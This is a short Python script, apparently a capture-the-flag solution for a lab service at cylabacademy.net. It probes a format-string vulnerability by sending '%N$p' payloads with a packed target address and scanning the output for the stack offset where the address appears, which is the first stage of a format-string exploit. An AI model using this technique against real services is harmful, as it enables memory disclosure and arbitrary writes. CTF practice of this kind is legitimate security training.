import sys, re, socket, time, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31929


def collect(s, t=1.4):
    s.settimeout(0.5)
    buf = b""
    t0 = time.time()
    while time.time() - t0 < t:
        try:
            c = s.recv(8192)
            if not c:
                break
            buf += c
        except socket.timeout:
            continue
    return buf


def run(a_bytes, b_bytes=b"2"):
    s = socket.create_connection((HOST, PORT), timeout=15)
    s.settimeout(6)
    collect(s, 0.9)
    s.sendall(a_bytes + b"\n")
    time.sleep(0.45)
    collect(s, 0.5)
    s.sendall(b_bytes + b"\n")
    time.sleep(0.9)
    o = collect(s, 1.4)
    s.close()
    return o


TARGET = 0x601030
# on met l'adresse APRES les spec (a cause des NUL) ; on essaie plusieurs longueurs de prefixe
for prelen in (13, 21, 29):
    pre = b"1" + b"A" * (prelen - 1)
    specs = b"".join(b"|%d$p" % p for p in range(10, 22))
    addr_off = 19 + prelen + len(specs)
    pad = (8 - (addr_off % 8)) % 8
    a = pre + specs + b"Z" * pad + struct.pack("<Q", TARGET)
    out = run(a)
    m = re.search(rb"Calculating for A: (.*?)and B:", out, re.S)
    seg = m.group(1) if m else out
    # decoder les |pos=valeur
    hits = re.findall(rb"\|(\d+)\$(?:p)?", seg)
    vals = re.findall(rb"\|(0x[0-9a-f]+|\(nil\))", seg)
    print("prelen=%d addr_off=%d pad=%d" % (prelen, addr_off, pad))
    print("   brut:", seg[:180])
    found = False
    for i, v in enumerate(vals, start=10):
        if v.lower() == b"0x601030":
            print("   >>> ADRESSE TROUVEE a la position %d" % i)
            found = True
    if not found:
        print("   (adresse non trouvee dans ce scan)")
